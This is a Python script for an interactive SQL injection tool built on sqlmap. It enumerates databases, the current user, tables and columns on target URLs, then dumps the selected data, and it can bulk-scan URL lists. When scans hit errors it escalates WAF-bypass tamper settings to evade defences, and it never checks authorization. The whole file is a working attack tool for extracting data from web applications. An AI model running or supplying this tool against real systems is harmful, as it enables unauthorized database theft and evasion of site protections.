#!/usr/bin/env python3
"""
Advanced SQLi Scanner Tool
Author: Security Tool
Description: Automated SQL Injection scanner using sqlmap with interactive database exploration
"""

import subprocess
import sys
import os
import re
import time
import signal
from urllib.parse import urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============== COLORS ==============
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_BLUE = '\033[44m'

C = Colors()

# ============== BANNER ==============
def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{C.RED}{C.BOLD}
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   ███████╗ ██████╗ ██╗     ██╗    ██╗  ██╗██╗   ██╗███╗   ██║
    ║   ██╔════╝██╔═══██╗██║     ██║    ██║  ██║██║   ██║████╗  ██║
    ║   ███████╗██║   ██║██║     ██║    ███████║██║   ██║██╔██╗ ██║
    ║   ╚════██║██║▄▄ ██║██║     ██║    ██╔══██║██║   ██║██║╚██╗██║
    ║   ███████║╚██████╔╝███████╗██║    ██║  ██║╚██████╔╝██║ ╚████║
    ║   ╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚══║
    ║                                                              ║
    ║          {C.CYAN}Advanced SQL Injection Scanner Tool{C.RED}                ║
    ║          {C.YELLOW}Automated Database Extraction Engine{C.RED}              ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
{C.RESET}
    {C.GREEN}[*] Version  : 2.0{C.RESET}
    {C.GREEN}[*] Mode     : Interactive Exploitation{C.RESET}
    {C.GREEN}[*] Engine   : sqlmap + Custom Logic{C.RESET}
    {C.YELLOW}{'─' * 60}{C.RESET}
"""
    print(banner)

# ============== UTILITY FUNCTIONS ==============
def print_info(msg):
    print(f"  {C.BLUE}[INFO]{C.RESET} {msg}")

def print_success(msg):
    print(f"  {C.GREEN}[✓]{C.RESET} {msg}")

def print_warning(msg):
    print(f"  {C.YELLOW}[!]{C.RESET} {msg}")

def print_error(msg):
    print(f"  {C.RED}[✗]{C.RESET} {msg}")

def print_scan(msg):
    print(f"  {C.MAGENTA}[SCAN]{C.RESET} {msg}")

def print_cmd(msg):
    print(f"  {C.CYAN}[CMD]{C.RESET} {C.WHITE}{msg}{C.RESET}")

def print_separator():
    print(f"  {C.YELLOW}{'─' * 58}{C.RESET}")

def print_header(msg):
    print(f"\n  {C.BOLD}{C.BG_BLUE} {msg} {C.RESET}\n")

def ask_yes_no(question):
    while True:
        ans = input(f"  {C.CYAN}[?]{C.RESET} {question} (y/n): ").strip().lower()
        if ans in ['y', 'yes']:
            return True
        elif ans in ['n', 'no']:
            return False
        else:
            print_warning("Please enter 'y' or 'n'")

def ask_choice(question):
    return input(f"  {C.CYAN}[?]{C.RESET} {question}: ").strip()

# ============== URL VALIDATION ==============
def has_parameters(url):
    """Check if URL has query parameters"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return len(params) > 0

def is_valid_url(url):
    """Validate URL format"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def remove_extension_urls(urls):
    """Remove URLs that end with static file extensions"""
    static_extensions = [
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.svg', '.ico',
        '.css', '.js', '.pdf', '.doc', '.docx', '.xls', '.xlsx',
        '.zip', '.rar', '.tar', '.gz', '.mp3', '.mp4', '.avi',
        '.mov', '.wmv', '.flv', '.swf', '.woff', '.woff2', '.ttf',
        '.eot', '.otf', '.xml', '.json', '.txt', '.csv', '.log',
        '.webp', '.tiff', '.psd', '.ai', '.eps', '.ps',
    ]
    filtered = []
    for url in urls:
        parsed = urlparse(url)
        path = parsed.path.lower()
        has_ext = any(path.endswith(ext) for ext in static_extensions)
        if not has_ext:
            filtered.append(url)
        else:
            print_warning(f"Removed static URL: {url}")
    return filtered

def check_url_live(url, timeout=10):
    """Check if URL is live using curl"""
    try:
        result = subprocess.run(
            ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', '-m', str(timeout), url],
            capture_output=True, text=True, timeout=timeout + 5
        )
        status_code = result.stdout.strip()
        if status_code and int(status_code) < 500:
            return True
        return False
    except:
        return False

def filter_live_urls(urls):
    """Filter only live URLs"""
    print_info("Checking which URLs are live...")
    live_urls = []
    total = len(urls)

    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_url = {executor.submit(check_url_live, url): url for url in urls}
        for i, future in enumerate(as_completed(future_to_url), 1):
            url = future_to_url[future]
            try:
                if future.result():
                    live_urls.append(url)
                    print_success(f"[{i}/{total}] LIVE: {url}")
                else:
                    print_error(f"[{i}/{total}] DEAD: {url}")
            except:
                print_error(f"[{i}/{total}] ERROR: {url}")

    return live_urls

# ============== SQLMAP EXECUTION ==============
def run_sqlmap_command(cmd, capture_output=True):
    """Run sqlmap command and return output"""
    print_cmd(' '.join(cmd))
    print_separator()

    try:
        if capture_output:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            output = ""
            while True:
                line = process.stdout.readline()
                if line == '' and process.poll() is not None:
                    break
                if line:
                    print(f"    {C.WHITE}{line.rstrip()}{C.RESET}")
                    output += line

            stderr = process.stderr.read()
            if stderr:
                output += stderr

            process.wait()
            return output, process.returncode
        else:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return result.stdout + result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        print_error("Command timed out!")
        return "", 1
    except KeyboardInterrupt:
        print_warning("Scan interrupted by user!")
        return "", 1
    except Exception as e:
        print_error(f"Error running command: {str(e)}")
        return "", 1

def count_errors_in_output(output):
    """Count error indicators in sqlmap output"""
    error_patterns = [
        r'all tested parameters do not appear to be injectable',
        r'connection timed out',
        r'target URL content is not stable',
        r'unable to connect to the target',
        r'page not found',
        r'connection refused',
        r'got a \d+ .* error',
        r'WAF/IPS',
        r'403 Forbidden',
        r'heuristic .* test shows that',
    ]
    count = 0
    for pattern in error_patterns:
        matches = re.findall(pattern, output, re.IGNORECASE)
        count += len(matches)
    return count

def parse_databases(output):
    """Parse database names from sqlmap output"""
    databases = []
    capture = False
    for line in output.split('\n'):
        line = line.strip()
        if 'available databases' in line.lower():
            capture = True
            continue
        if capture:
            if line.startswith('[*]'):
                db_name = line.replace('[*]', '').strip()
                if db_name:
                    databases.append(db_name)
            elif line == '' and databases:
                break
    return databases

def parse_tables(output):
    """Parse table names from sqlmap output"""
    tables = []
    capture = False
    for line in output.split('\n'):
        line = line.strip()
        if 'Database:' in line:
            capture = True
            continue
        if capture:
            if line.startswith('|'):
                table = line.strip('|').strip()
                if table and table != '' and not all(c == '-' for c in table):
                    tables.append(table)
            elif line.startswith('[') and 'table' in line.lower():
                continue
            elif line.startswith('+'):
                continue
    return tables

def parse_columns(output):
    """Parse column names from sqlmap output"""
    columns = []
    capture = False
    for line in output.split('\n'):
        line = line.strip()
        if line.startswith('+') and '---' in line:
            capture = True
            continue
        if capture and line.startswith('|'):
            parts = [p.strip() for p in line.strip('|').split('|')]
            if parts and parts[0] and not all(c == '-' for c in parts[0]):
                col_name = parts[0].strip()
                if col_name and col_name.lower() != 'column' and col_name.lower() != 'type':
                    columns.append(col_name)
    return columns

def parse_current_user_db(output):
    """Parse current user and current database from output"""
    current_user = None
    current_db = None
    for line in output.split('\n'):
        if 'current user:' in line.lower():
            match = re.search(r"current user:\s*['\"]?(.+?)['\"]?\s*$", line, re.IGNORECASE)
            if match:
                current_user = match.group(1).strip().strip("'\"")
        if 'current database:' in line.lower():
            match = re.search(r"current database:\s*['\"]?(.+?)['\"]?\s*$", line, re.IGNORECASE)
            if match:
                current_db = match.group(1).strip().strip("'\"")
    return current_user, current_db

# ============== DISPLAY FUNCTIONS ==============
def display_numbered_list(items, label):
    """Display items with numbers for selection"""
    print_header(f"Available {label}")
    for i, item in enumerate(items, 1):
        print(f"    {C.YELLOW}[{i}]{C.RESET} {C.WHITE}{item}{C.RESET}")
    print_separator()

def select_items(items, label):
    """Let user select one or multiple items"""
    display_numbered_list(items, label)
    print_info(f"Enter number(s) to select {label} (comma-separated for multiple, 'all' for all)")
    choice = ask_choice(f"Select {label}")

    if choice.lower() == 'all':
        return items

    selected = []
    try:
        indices = [int(x.strip()) for x in choice.split(',')]
        for idx in indices:
            if 1 <= idx <= len(items):
                selected.append(items[idx - 1])
            else:
                print_warning(f"Invalid number: {idx}, skipping...")
    except ValueError:
        print_error("Invalid input! Please enter numbers separated by commas.")
        return select_items(items, label)

    if not selected:
        print_error("No valid selection made!")
        return select_items(items, label)

    return selected

# ============== WAF BYPASS TECHNIQUES ==============
def get_waf_bypass_args(level=1):
    """Get WAF bypass arguments based on escalation level"""
    if level == 1:
        return [
            '--tamper=space2comment',
            '--random-agent',
            '--delay=2',
        ]
    elif level == 2:
        return [
            '--tamper=space2comment,between,randomcase',
            '--random-agent',
            '--delay=3',
            '--timeout=60',
            '--retries=3',
        ]
    elif level == 3:
        return [
            '--tamper=space2comment,between,randomcase,charencode',
            '--random-agent',
            '--delay=5',
            '--timeout=90',
            '--retries=5',
            '--level=3',
            '--risk=2',
        ]
    elif level >= 4:
        return [
            '--tamper=space2comment,between,randomcase,charencode,equaltolike,percentage',
            '--random-agent',
            '--delay=5',
            '--timeout=120',
            '--retries=5',
            '--level=5',
            '--risk=3',
            '--hpp',
        ]
    return []

# ============== MAIN SCAN LOGIC ==============
def scan_single_url(url):
    """Complete scan workflow for a single URL"""

    print_header(f"SCANNING TARGET: {url}")

    # ==========================================
    # PHASE 1: Find Databases (--dbs)
    # ==========================================
    print_header("PHASE 1: Database Discovery (--dbs)")

    base_cmd = ['sqlmap', '-u', url, '--batch', '--dbs']
    error_count = 0
    databases = []
    waf_level = 0

    while True:
        if waf_level > 0:
            print_warning(f"Applying WAF bypass techniques (Level {waf_level})...")
            waf_args = get_waf_bypass_args(waf_level)
            cmd = base_cmd + waf_args
        else:
            cmd = base_cmd[:]

        output, returncode = run_sqlmap_command(cmd)

        # Parse databases
        databases = parse_databases(output)

        if databases:
            print_success(f"Found {len(databases)} database(s)!")
            for db in databases:
                print(f"    {C.GREEN}→ {db}{C.RESET}")
            break

        # Count errors
        errors = count_errors_in_output(output)
        error_count += errors
        print_warning(f"Error count: {error_count}")

        if error_count >= 3:
            waf_level += 1
            if waf_level > 4:
                print_error("Maximum WAF bypass levels exhausted. Could not find databases.")
                if ask_yes_no("Do you want to continue with manual approach?"):
                    break
                else:
                    return
            print_warning(f"Errors exceeded threshold. Escalating to WAF bypass level {waf_level}...")
            error_count = 0
        else:
            # If no databases and no significant errors, might just not be injectable
            if 'not injectable' in output.lower():
                error_count += 3  # Force WAF bypass attempt
            else:
                print_error("No databases found in this attempt.")
                if not ask_yes_no("Retry with WAF bypass?"):
                    print_error("Cannot proceed without databases. Skipping this URL.")
                    return
                waf_level += 1

    if not databases:
        print_error("No databases found. Skipping this URL.")
        return

    # ==========================================
    # PHASE 2: Current User & Current DB
    # ==========================================
    print_header("PHASE 2: Current User & Current Database")

    cmd = ['sqlmap', '-u', url, '--batch', '--current-user', '--current-db']
    if waf_level > 0:
        cmd += get_waf_bypass_args(waf_level)

    output, returncode = run_sqlmap_command(cmd)

    current_user, current_db = parse_current_user_db(output)

    if current_user:
        print_success(f"Current User: {C.GREEN}{current_user}{C.RESET}")
    else:
        print_warning("Could not determine current user.")

    if current_db:
        print_success(f"Current Database: {C.GREEN}{current_db}{C.RESET}")
    else:
        print_warning("Could not determine current database.")

    if not current_user and not current_db:
        print_warning("Could not find current user/db, but we have databases from --dbs.")
        if not ask_yes_no("Continue with database exploration?"):
            return

    # ==========================================
    # PHASE 3: Tables Discovery
    # ==========================================
    print_header("PHASE 3: Table Discovery")

    if not ask_yes_no("Do you want to find tables?"):
        print_info("Skipping table discovery.")
        return

    # Select databases
    selected_databases = select_items(databases, "Databases")
    print_info(f"Selected databases: {', '.join(selected_databases)}")

    all_tables_data = {}  # {db_name: [tables]}

    for db_name in selected_databases:
        print_header(f"Finding tables in database: {db_name}")

        cmd = ['sqlmap', '-u', url, '-D', db_name, '--batch', '--tables']
        if waf_level > 0:
            cmd += get_waf_bypass_args(waf_level)

        output, returncode = run_sqlmap_command(cmd)

        tables = parse_tables(output)

        if tables:
            print_success(f"Found {len(tables)} table(s) in '{db_name}'!")
            for t in tables:
                print(f"    {C.GREEN}→ {t}{C.RESET}")
            all_tables_data[db_name] = tables
        else:
            print_error(f"No tables found in database '{db_name}'.")
            all_tables_data[db_name] = []

    if not any(all_tables_data.values()):
        print_error("No tables found in any database.")
        return

    # ==========================================
    # PHASE 4: Column Discovery
    # ==========================================
    print_header("PHASE 4: Column Discovery")

    if not ask_yes_no("Do you want to find columns?"):
        print_info("Skipping column discovery.")
        return

    all_columns_data = {}  # {(db, table): [columns]}

    for db_name, tables in all_tables_data.items():
        if not tables:
            continue

        print_header(f"Select tables from database: {db_name}")
        selected_tables = select_items(tables, f"Tables in '{db_name}'")
        print_info(f"Selected tables: {', '.join(selected_tables)}")

        for table_name in selected_tables:
            print_header(f"Finding columns in {db_name}.{table_name}")

            cmd = [
                'sqlmap', '-u', url,
                '-D', db_name,
                '-T', table_name,
                '--columns', '--batch'
            ]
            if waf_level > 0:
                cmd += get_waf_bypass_args(waf_level)

            output, returncode = run_sqlmap_command(cmd)

            columns = parse_columns(output)

            if columns:
                print_success(f"Found {len(columns)} column(s) in '{db_name}.{table_name}'!")
                for col in columns:
                    print(f"    {C.GREEN}→ {col}{C.RESET}")
                all_columns_data[(db_name, table_name)] = columns
            else:
                print_error(f"No columns found in '{db_name}.{table_name}'.")
                all_columns_data[(db_name, table_name)] = []

    if not any(all_columns_data.values()):
        print_error("No columns found in any table.")
        return

    # ==========================================
    # PHASE 5: Data Dump
    # ==========================================
    print_header("PHASE 5: Data Extraction")

    if not ask_yes_no("Do you want to dump data from specific columns?"):
        print_info("Scan complete. No data dumped.")
        return

    for (db_name, table_name), columns in all_columns_data.items():
        if not columns:
            continue

        print_header(f"Select columns from {db_name}.{table_name}")
        selected_columns = select_items(columns, f"Columns in '{db_name}.{table_name}'")
        columns_str = ','.join(selected_columns)
        print_info(f"Selected columns: {columns_str}")

        cmd = [
            'sqlmap', '-u', url,
            '-D', db_name,
            '-T', table_name,
            '-C', columns_str,
            '--dump', '--batch'
        ]
        if waf_level > 0:
            cmd += get_waf_bypass_args(waf_level)

        print_header(f"Dumping data: {db_name}.{table_name} [{columns_str}]")
        output, returncode = run_sqlmap_command(cmd)

        if 'dumped to' in output.lower() or 'table' in output.lower():
            print_success(f"Data dump completed for {db_name}.{table_name}!")
        else:
            print_warning(f"Data dump may have issues for {db_name}.{table_name}.")

    print_header("SCAN COMPLETE")
    print_success("All selected operations completed successfully!")

# ============== MODE HANDLERS ==============
def mode_single_url():
    """Handle single URL mode"""
    print_header("MODE: Single URL Scan")

    url = ask_choice("Enter target URL with parameters")

    # Validate URL
    if not is_valid_url(url):
        print_error("Invalid URL format! Please include http:// or https://")
        return

    # Check for parameters
    if not has_parameters(url):
        print_error("URL does not contain any parameters!")
        print_error("Example: http://example.com/page.php?id=1")
        print_error("SQLi scanner requires URL parameters to test.")
        return

    print_success(f"URL validated: {url}")
    print_success("Parameters detected!")

    # Check if URL is live
    print_info("Checking if target is live...")
    if not check_url_live(url):
        print_error("Target URL appears to be dead or unreachable!")
        if not ask_yes_no("Continue anyway?"):
            return
    else:
        print_success("Target is live!")

    # Remove extension-based check for single URL
    urls = remove_extension_urls([url])
    if not urls:
        print_error("URL was filtered out (static file extension).")
        return

    scan_single_url(urls[0])

def mode_file_path():
    """Handle file path mode"""
    print_header("MODE: File-based Bulk Scan")

    file_path = ask_choice("Enter file path containing URLs")

    # Validate file
    if not os.path.isfile(file_path):
        print_error(f"File not found: {file_path}")
        return

    # Read URLs from file
    with open(file_path, 'r') as f:
        raw_urls = [line.strip() for line in f.readlines() if line.strip()]

    if not raw_urls:
        print_error("File is empty!")
        return

    print_info(f"Total URLs loaded: {len(raw_urls)}")

    # Validate URLs
    valid_urls = []
    invalid_count = 0
    no_param_count = 0

    for url in raw_urls:
        if not is_valid_url(url):
            print_warning(f"Invalid URL skipped: {url}")
            invalid_count += 1
            continue
        if not has_parameters(url):
            print_warning(f"No parameters, skipped: {url}")
            no_param_count += 1
            continue
        valid_urls.append(url)

    print_separator()
    print_info(f"Valid URLs with parameters: {len(valid_urls)}")
    print_info(f"Invalid URLs skipped: {invalid_count}")
    print_info(f"URLs without parameters skipped: {no_param_count}")

    if not valid_urls:
        print_error("No valid URLs with parameters found in the file!")
        return

    # Remove extension-based URLs
    print_info("Removing static extension URLs...")
    valid_urls = remove_extension_urls(valid_urls)

    if not valid_urls:
        print_error("All URLs were filtered out!")
        return

    print_info(f"URLs after extension filter: {len(valid_urls)}")

    # Check live URLs
    print_info("Filtering live URLs...")
    live_urls = filter_live_urls(valid_urls)

    if not live_urls:
        print_error("No live URLs found!")
        return

    print_success(f"Live URLs ready for scan: {len(live_urls)}")
    print_separator()

    # Display live URLs
    display_numbered_list(live_urls, "Live URLs")

    if ask_yes_no("Do you want to scan ALL live URLs?"):
        for i, url in enumerate(live_urls, 1):
            print_header(f"SCANNING URL [{i}/{len(live_urls)}]")
            scan_single_url(url)
            if i < len(live_urls):
                if not ask_yes_no("Continue to next URL?"):
                    break
    else:
        selected_urls = select_items(live_urls, "URLs to scan")
        for i, url in enumerate(selected_urls, 1):
            print_header(f"SCANNING URL [{i}/{len(selected_urls)}]")
            scan_single_url(url)
            if i < len(selected_urls):
                if not ask_yes_no("Continue to next URL?"):
                    break

    print_header("ALL SCANS COMPLETE")

# ============== CHECK DEPENDENCIES ==============
def check_dependencies():
    """Check if sqlmap is installed"""
    try:
        result = subprocess.run(
            ['sqlmap', '--version'],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            version = result.stdout.strip()
            print_success(f"sqlmap found: {version}")
            return True
    except FileNotFoundError:
        print_error("sqlmap is NOT installed!")
        print_info("Install: sudo apt install sqlmap")
        print_info("Or: pip install sqlmap")
        return False
    except Exception as e:
        print_error(f"Error checking sqlmap: {e}")
        return False

# ============== MAIN ==============
def main():
    print_banner()

    # Check dependencies
    if not check_dependencies():
        sys.exit(1)

    print_separator()

    # Mode selection
    print(f"""
    {C.BOLD}{C.WHITE}Select Scan Mode:{C.RESET}

    {C.YELLOW}[1]{C.RESET} {C.WHITE}Single URL{C.RESET}       - Scan a single URL with parameters
    {C.YELLOW}[2]{C.RESET} {C.WHITE}File Path{C.RESET}        - Scan multiple URLs from a file
    {C.YELLOW}[0]{C.RESET} {C.WHITE}Exit{C.RESET}
    """)

    choice = ask_choice("Enter your choice (1/2/0)")

    if choice == '1':
        mode_single_url()
    elif choice == '2':
        mode_file_path()
    elif choice == '0':
        print_info("Exiting... Goodbye!")
        sys.exit(0)
    else:
        print_error("Invalid choice! Please select 1, 2, or 0.")
        main()

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.RED}[!] Interrupted by user. Exiting...{C.RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n  {C.RED}[CRITICAL] {e}{C.RESET}\n")
        sys.exit(1)
